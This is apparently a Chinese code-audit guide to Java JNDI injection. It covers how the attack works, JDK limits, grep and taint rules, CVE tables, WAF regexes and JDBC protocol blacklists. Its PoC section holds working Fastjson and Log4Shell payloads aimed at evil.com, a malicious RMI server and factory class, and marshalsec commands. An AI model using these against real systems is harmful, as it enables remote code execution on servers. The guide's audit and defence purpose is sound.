# Java JNDI Injection - JNDI 注入完整审计规则

> JNDI (Java Naming and Directory Interface) 注入漏洞深度分析  
> 基于 javasec 项目学习成果

---

## 漏洞原理

### JNDI 注入三要素

1. ✅ 应用调用了 `lookup()` 或 `search()` 方法
2. ✅ 参数部分或全部可控（URL 或名称）
3. ✅ 攻击者可以搭建恶意 RMI/LDAP 服务

### Reference 远程类加载

**攻击流程**:
```
客户端 lookup("rmi://evil.com/Exploit")
  → RMI 返回 Reference 对象
  → 客户端从 codebase 下载 .class
  → 实例化恶意类
  → 执行构造函数/static 块 → RCE ✅
```

**关键代码**:
```java
Reference ref = new Reference(
    "ClassName",           // 类名
    "FactoryClassName",    // 工厂类 (会被实例化)
    "http://evil.com/"     // codebase (远程 class 地址)
);
```

---

## JDK 版本限制

| JDK 版本 | RMI Reference | LDAP Reference | 本地 Gadget |
|---------|--------------|---------------|------------|
| < 6u141, 7u131 | ✅ 可用 | ✅ 可用 | ✅ 可用 |
| 6u141 ~ 8u190 | ❌ 禁止 | ✅ 可用 | ✅ 可用 |
| 8u191, 11.0.1+ | ❌ 禁止 | ❌ 禁止 | ✅ 可用 |

**限制原因**:
- `com.sun.jndi.rmi.object.trustURLCodebase=false` (JDK 8u121+)
- `com.sun.jndi.ldap.object.trustURLCodebase=false` (JDK 8u191+)

**绕过方式**:
- ✅ 使用本地 classpath 中的 Gadget 类
- ✅ LDAP 返回序列化的 Gadget 对象 (需相关依赖)
- ✅ 使用本地 Factory 类 (如 Tomcat BeanFactory)

---

## 代码审计检测

### 第一步: 搜索 JNDI 调用

```bash
# 检测 InitialContext
grep -rn "InitialContext" --include="*.java"

# 检测 lookup 方法
grep -rn "\.lookup\(" --include="*.java" | grep -v "^//"

# 检测 DirContext.search
grep -rn "\.search\(" --include="*.java"

# 检测 Reference 使用
grep -rn "new Reference" --include="*.java"
```

### 第二步: 识别可控参数

**危险模式**:
```java
// ❌ 高危: URL 完全可控
String url = request.getParameter("url");
ctx.lookup(url);

// ❌ 高危: 名称可控
String name = request.getParameter("name");
ctx.lookup("rmi://internal:1099/" + name);

// ❌ 中危: 从数据库/配置读取
String url = database.getConfig("jndi.url");
ctx.lookup(url);
```

**安全模式**:
```java
// ✓ 硬编码
ctx.lookup("rmi://localhost:1099/Service");

// ✓ 白名单验证
if (WHITELIST.contains(name)) {
    ctx.lookup("rmi://localhost:1099/" + name);
}
```

### 第三步: 污点分析规则

**Source (污点源)**:
```regex
request\.getParameter\(
request\.getHeader\(
System\.getProperty\(
properties\.getProperty\(
```

**Sink (危险点)**:
```java
// 关键类和方法
javax.naming.InitialContext.lookup()
javax.naming.Context.lookup()
javax.naming.Context.lookupLink()
javax.naming.directory.DirContext.search()
```

**数据流追踪**:
```
HTTP参数 → 变量 → lookup() 参数 = 高危 ✅
配置文件 → 变量 → lookup() 参数 = 中危 ⚠️
硬编码常量 → lookup() 参数 = 安全 ✓
```

---

## 实战 PoC

### PoC 1: Fastjson + JNDI

**漏洞代码**:
```java
import com.alibaba.fastjson.JSON;

public class Vuln {
    public static void main(String[] args) {
        JSON.parseObject(args[0]);  // ⚠️ JNDI 注入
    }
}
```

**Payload**:
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://evil.com:1099/Exploit",
    "autoCommit": true
}
```

**攻击流程**:
1. Fastjson 反序列化 `JdbcRowSetImpl`
2. 调用 `setDataSourceName()` 和 `setAutoCommit(true)`
3. `setAutoCommit()` 触发 `connect()`
4. `connect()` 内部调用 `InitialContext.lookup(dataSourceName)`
5. ✅ JNDI 注入 RCE

---

### PoC 2: Log4j2 RCE (CVE-2021-44228)

**漏洞代码**:
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jVuln {
    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        logger.info("User: {}", args[0]);  // ⚠️ JNDI 注入
    }
}
```

**Payload**:
```
${jndi:rmi://evil.com:1099/Exploit}
${jndi:ldap://evil.com:1389/Exploit}
${jndi:ldap://127.0.0.1#evil.com:1389/Exploit}  // DNS Rebinding
```

**影响版本**: Log4j 2.0-beta9 ~ 2.14.1

---

### PoC 3: 攻击者 RMI 服务端

**恶意 RMI 服务**:
```java
import javax.naming.Reference;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.registry.*;

public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);

        Reference ref = new Reference(
            "Exploit",
            "ExploitFactory",
            "http://evil.com:8080/"  // 托管恶意 .class
        );

        registry.bind("Exploit", new ReferenceWrapper(ref));
        System.out.println("[+] RMI Server listening on 1099");
    }
}
```

**恶意工厂类** (`ExploitFactory.java`):
```java
import javax.naming.*;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class ExploitFactory implements ObjectFactory {
    // static 块会在类加载时立即执行
    static {
        try {
            Runtime.getRuntime().exec("calc");  // ✅ RCE
        } catch (Exception e) {}
    }

    public Object getObjectInstance(Object obj, Name name,
                                     Context ctx, Hashtable<?, ?> env) {
        return null;
    }
}
```

编译并托管:
```bash
javac ExploitFactory.java
python3 -m http.server 8080  # 托管 ExploitFactory.class
```

---

### PoC 4: 使用 marshalsec 工具

```bash
# 启动恶意 LDAP 服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer \
  "http://evil.com:8080/#ExploitFactory" \
  1389

# 或启动恶意 RMI 服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.RMIRefServer \
  "http://evil.com:8080/#ExploitFactory" \
  1099
```

---

## 防御措施

### 1. JDK 升级 (推荐)

**升级到安全版本**:
- ✅ JDK 8u191+ / 11.0.1+
- ✅ 自动禁用 `trustURLCodebase`

**验证配置**:
```java
System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase");   // false
System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase");  // false
```

---

### 2. 输入验证和白名单

**严格白名单**:
```java
import java.util.*;

public class SafeJNDI {
    private static final Set<String> WHITELIST = new HashSet<>(Arrays.asList(
        "rmi://localhost:1099/ServiceA",
        "rmi://localhost:1099/ServiceB"
    ));

    public Object safeLookup(String url) throws Exception {
        if (!WHITELIST.contains(url)) {
            throw new SecurityException("JNDI URL not in whitelist");
        }
        return new InitialContext().lookup(url);
    }
}
```

**URL 格式验证**:
```java
import java.net.URI;

public Object validateLookup(String url) throws Exception {
    URI uri = new URI(url);

    // 只允许 RMI 协议
    if (!"rmi".equals(uri.getScheme())) {
        throw new SecurityException("Only RMI allowed");
    }

    // 只允许 localhost
    if (!"localhost".equals(uri.getHost())) {
        throw new SecurityException("Only localhost allowed");
    }

    return new InitialContext().lookup(url);
}
```

---

### 3. WAF / RASP 规则

**检测模式**:
```regex
# JNDI URL 模式
rmi://[^/]+/
ldap://[^/]+/
ldaps://[^/]+/
dns://[^/]+/

# Log4j Payload 模式
\$\{jndi:(rmi|ldap|dns)://
\$\{jndi:\$\{
```

**Nginx WAF 规则**:
```nginx
# 阻止 JNDI Payload
if ($request_uri ~* "\$\{jndi:") {
    return 403;
}

if ($http_user_agent ~* "\$\{jndi:") {
    return 403;
}
```

---

### 4. Log4j 专项防御

**临时缓解** (Log4j 2.10+):
```bash
# 设置环境变量
export LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# 或 JVM 参数
java -Dlog4j2.formatMsgNoLookups=true -jar app.jar
```

**永久修复**:
```bash
# 升级到安全版本
Log4j 2.17.0+ (Java 8)
Log4j 2.12.3+ (Java 7)
Log4j 2.3.1+  (Java 6)
```

**移除 JndiLookup 类**:
```bash
zip -q -d log4j-core-*.jar \
  org/apache/logging/log4j/core/lookup/JndiLookup.class
```

---

## 相关 CVE

### JNDI 注入重大漏洞

| CVE | 组件 | 影响版本 | 描述 |
|-----|------|---------|------|
| **CVE-2021-44228** | Log4j2 | 2.0-beta9 ~ 2.14.1 | Log4Shell，JNDI 注入 RCE |
| **CVE-2021-45046** | Log4j2 | 2.15.0 | Log4Shell 不完全修复 |
| **CVE-2021-45105** | Log4j2 | 2.0-beta9 ~ 2.16.0 | DoS via JNDI |
| **CVE-2020-1948** | Dubbo | 2.7.0 ~ 2.7.6 | 反序列化 + JNDI 注入 |
| **CVE-2019-17571** | Log4j 1.x | 全版本 | SocketServer JNDI 注入 |
| **CVE-2016-4437** | Shiro | < 1.2.5 | RememberMe 反序列化 + JNDI |
| **CVE-2019-2725** | Weblogic | 10.3.6, 12.1.3 | XMLDecoder + JNDI |
| **CVE-2017-18349** | Fastjson | < 1.2.24 | JdbcRowSetImpl JNDI |

---

## 审计 Checklist

代码审计时的检查清单：

- [ ] 搜索所有 `lookup()` 调用，确认参数来源
- [ ] 搜索所有 `search()` 调用，检查过滤条件
- [ ] 确认没有拼接用户输入构造 JNDI URL
- [ ] 检查 JDK 版本 (推荐 8u191+ / 11.0.1+)
- [ ] 验证 `trustURLCodebase` 配置 (应为 false)
- [ ] 检查依赖库中的 JNDI 使用 (Fastjson, Log4j, Dubbo)
- [ ] 实施白名单验证机制
- [ ] 配置 WAF/RASP 防护规则
- [ ] 检查日志记录是否包含用户输入 (Log4j)
- [ ] 审计配置文件中的 JNDI URL

---

## 检测工具

### 自动化扫描

```bash
# Semgrep
semgrep --config="p/java" --pattern='$CTX.lookup($URL)' .

# grep 快速检测
grep -rn "\.lookup\(" --include="*.java" | grep -v "//"

# FindSecBugs (SpotBugs)
# 规则: JNDI_INJECTION
```

### 手动检测脚本

```bash
#!/bin/bash
echo "=== JNDI Injection Scanner ==="

# 检测 lookup
echo "[1] Checking lookup() calls..."
grep -rn "\.lookup\(" --include="*.java" --color=auto

# 检测 Reference
echo "[2] Checking Reference usage..."
grep -rn "new Reference" --include="*.java" --color=auto

# 检测 JdbcRowSetImpl
echo "[3] Checking JdbcRowSetImpl..."
grep -rn "JdbcRowSetImpl" --include="*.java" --color=auto

# 检测 Log4j
echo "[4] Checking Log4j..."
find . -name "log4j-core-*.jar" -exec echo "Found: {}" \;

echo "=== Scan Complete ==="
```

---

## 参考资源

### 工具
- [marshalsec](https://github.com/mbechler/marshalsec) - JNDI 利用工具
- [JNDIExploit](https://github.com/feihong-cs/JNDIExploit) - JNDI 利用工具包
- [ysoserial](https://github.com/frohoff/ysoserial) - 反序列化 Payload
- [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)

### 文档
- [A Journey From JNDI/LDAP To Remote Code Execution](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
- [Log4Shell 完整分析](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [JNDI 注入知识详解](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)

---

## 最小 PoC 示例
```bash
# Log4j JNDI 注入探测 (需受控 LDAP)
curl 'http://app.example.com/search?name=${jndi:ldap://attacker/a}'

# JNDI lookup 可控
rg -n "InitialContext|lookup|search" --glob "*.java"
```

---

---

## JDBC 协议注入 (CVE-2025-64428 类漏洞)

### 背景

JDBC 连接 URL 支持多种协议，部分协议可能导致 JNDI 注入或 SSRF。当数据源配置允许用户控制 JDBC URL 或参数时，需要严格验证协议白名单。

### 危险协议列表

| 协议 | 风险类型 | CVE 示例 | 说明 |
|------|----------|----------|------|
| `ldap://` | JNDI注入 | CVE-2025-64164 | LDAP协议JNDI注入 |
| `ldaps://` | JNDI注入 | - | LDAP over SSL |
| `rmi://` | JNDI注入 | - | RMI协议JNDI注入 |
| `dns://` | SSRF | CVE-2025-64163 | DNS协议可泄露内网信息 |
| `iiop://` | JNDI注入 | CVE-2025-64428 | CORBA IIOP协议绕过黑名单 |
| `iiopname:` | JNDI注入 | CVE-2025-64428 | IIOP命名服务 |
| `corbaname:` | JNDI注入 | CVE-2025-64428 | CORBA命名服务 |
| `corbaloc:` | JNDI注入 | - | CORBA定位器 |
| `file://` | 文件读取 | - | 本地文件泄露 |
| `ftp://` | SSRF | - | FTP协议SSRF |
| `http://` | SSRF | - | HTTP协议SSRF |
| `https://` | SSRF | - | HTTPS协议SSRF |

### 检测命令

```bash
# 1. 搜索JDBC URL处理代码
grep -rn "jdbc:\|JdbcRowSet\|dataSourceName" --include="*.java"

# 2. 搜索危险协议（可能绕过黑名单）
grep -rn "iiop://\|iiopname:\|corbaname:\|corbaloc:" --include="*.java"

# 3. 搜索协议黑名单配置
grep -rn "illegalParameters\|blacklist\|getIllegal" --include="*.java"

# 4. 搜索数据源类型配置
grep -rn "class.*extends.*Configuration\|DatasourceType\|datasourceType" --include="*.java"
```

### 黑名单完整性检查

审计数据源安全时，检查黑名单是否包含**所有**危险协议:

```java
// 完整的协议黑名单示例
private List<String> getCompleteIllegalParameters() {
    return Arrays.asList(
        // JNDI相关
        "java.naming.factory.initial",
        "java.naming.provider.url",
        "java.naming.factory.object",
        "java.naming.factory.state",

        // RMI/LDAP协议
        "rmi://", "rmi:",
        "ldap://", "ldaps://",

        // CORBA/IIOP协议 (CVE-2025-64428)
        "iiop://", "iiop:",
        "iiopname:", "iiopname://",
        "corbaname:", "corbaname://",
        "corbaloc:", "corbaloc://",

        // 其他危险协议
        "dns://", "dns:",
        "file://", "file:",
        "ftp://", "ftp:",
        "http://", "https://",

        // 反序列化相关
        "autoDeserialize",
        "connectionProperties",
        "initSQL"
    );
}
```

### 漏洞代码示例

```java
// ❌ 危险: 黑名单不完整，缺少iiop/corbaname协议
private List<String> getOracleIllegalParameters() {
    return Arrays.asList(
        "ldap://", "ldaps://", "rmi",
        "dns", "file", "ftp"
        // 缺少: iiop://, iiopname:, corbaname:, corbaloc:
    );
}

// ❌ 危险: 黑名单检查可被大小写绕过
public boolean isIllegalParameter(String param) {
    for (String illegal : illegalParameters) {
        if (param.contains(illegal)) {  // 没有忽略大小写
            return true;
        }
    }
    return false;
}
```

### 安全实现示例

```java
// ✓ 安全: 完整的协议白名单验证
public void validateJdbcUrl(String jdbcUrl) {
    String lowerUrl = jdbcUrl.toLowerCase();

    // 只允许标准JDBC协议
    if (!lowerUrl.startsWith("jdbc:mysql://") &&
        !lowerUrl.startsWith("jdbc:postgresql://") &&
        !lowerUrl.startsWith("jdbc:oracle:thin:@") &&
        !lowerUrl.startsWith("jdbc:sqlserver://")) {
        throw new SecurityException("Invalid JDBC URL protocol");
    }

    // 检查是否包含危险协议
    String[] dangerousProtocols = {
        "ldap://", "ldaps://", "rmi://", "rmi:",
        "iiop://", "iiop:", "iiopname:", "corbaname:", "corbaloc:",
        "dns://", "dns:", "file://", "file:", "ftp://"
    };

    for (String protocol : dangerousProtocols) {
        if (lowerUrl.contains(protocol)) {
            throw new SecurityException("Dangerous protocol detected: " + protocol);
        }
    }
}
```

---

## 数据源配置安全审计

### 审计清单

当项目支持动态配置数据源时，需要检查:

- [ ] **JDBC URL 验证**: 是否验证 URL 协议白名单
- [ ] **协议黑名单完整性**: 是否包含所有危险协议 (特别是 iiop/corbaname)
- [ ] **大小写处理**: 黑名单检查是否忽略大小写
- [ ] **参数过滤**: extraParams 是否过滤危险参数
- [ ] **连接属性**: connectionProperties 是否可被注入
- [ ] **SSH隧道配置**: SSH配置是否可被利用
- [ ] **密码加密**: 数据库密码是否加密存储

### 高危配置类

搜索并审计以下类型的配置类:

```bash
# 搜索数据源配置类
grep -rn "class.*Configuration\|class.*DatasourceConfig" --include="*.java"

# 搜索JDBC URL构建代码
grep -rn "jdbc.*=.*String.format\|getJdbcUrl\|buildJdbcUrl" --include="*.java"

# 搜索数据源类型枚举
grep -rn "enum.*DatasourceType\|enum.*DbType" --include="*.java"
```

---

## 相关 CVE (2025更新)

### JDBC/JNDI 注入 CVE

| CVE | 影响版本 | 漏洞类型 | 描述 |
|-----|----------|----------|------|
| **CVE-2025-64428** | DataEase < 2.10.17 | JNDI注入 | iiop/corbaname/iiopname 协议绕过黑名单 |
| **CVE-2025-64163** | DataEase ≤ 2.10.14 | SSRF | dns:// 协议 SSRF |
| **CVE-2025-64164** | DataEase ≤ 2.10.14 | JNDI注入 | Oracle JDBC JNDI注入 |

---

**最后更新**: 2026-02-05
**版本**: 2.0
**审计重点**: lookup() 参数可控、JDK 版本检查、依赖库审计、**JDBC协议黑名单完整性**、**iiop/corbaname协议绕过**
